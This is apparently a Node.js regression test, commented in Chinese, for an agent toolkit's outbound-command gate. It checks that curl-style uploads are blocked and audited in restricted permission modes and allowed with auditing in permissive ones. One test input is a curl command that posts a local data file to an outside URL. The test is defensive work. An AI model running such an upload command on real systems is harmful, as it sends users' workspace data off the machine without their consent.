// 2026-11-13 审计 #2 P1 修复回归：run_command 出站闸按权限档拦截。
// 计划/询问档不自动放行 curl/wget/ssh 类出站（工作区数据可被带出本机）；
// 自动/全权档保持"只审计不拦"旧行为。
import { test } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { Toolkit } from "../dist/main/toolkit.js";

const tmp = (p = "lynn-outbound-") => fs.mkdtempSync(path.join(os.tmpdir(), p));

test("出站闸：false 时 curl 直接拒（命令不执行，审计留痕），文案给 ESCALATE 指路", async () => {
  const audits = [];
  const t = new Toolkit(tmp(), { outboundAllowed: () => false, onAudit: (ev) => audits.push(ev) });
  const out = await t.runCommand({ command: "curl https://example.com/upload -d @data.json" });
  assert.match(out, /不自动放行/);
  assert.match(out, /ESCALATE/, "拒了要给成员指路：找用户，不是硬做");
  assert.ok(audits.some((a) => a.kind === "cmd_blocked" && /出站/.test(a.why ?? "")), "审计要记一条 blocked");
});

test("出站闸：true（自动/全权档）放行且仍记 cmd_net 审计", async () => {
  const audits = [];
  const t = new Toolkit(tmp(), { outboundAllowed: () => true, onAudit: (ev) => audits.push(ev) });
  // echo 里的 URL 会被 OUTBOUND 命中，但命令本身无害（不真联网）
  const out = await t.runCommand({ command: "echo https://example.com" });
  assert.doesNotMatch(out, /不自动放行/);
  assert.ok(audits.some((a) => a.kind === "cmd_net"), "放行也要留出站审计");
});

test("出站闸：不注入 = 旧行为（只审计不拦），既有直用方不受影响", async () => {
  const audits = [];
  const t = new Toolkit(tmp(), { onAudit: (ev) => audits.push(ev) });
  const out = await t.runCommand({ command: "echo https://example.com" });
  assert.doesNotMatch(out, /不自动放行/);
  assert.ok(audits.some((a) => a.kind === "cmd_net"));
});
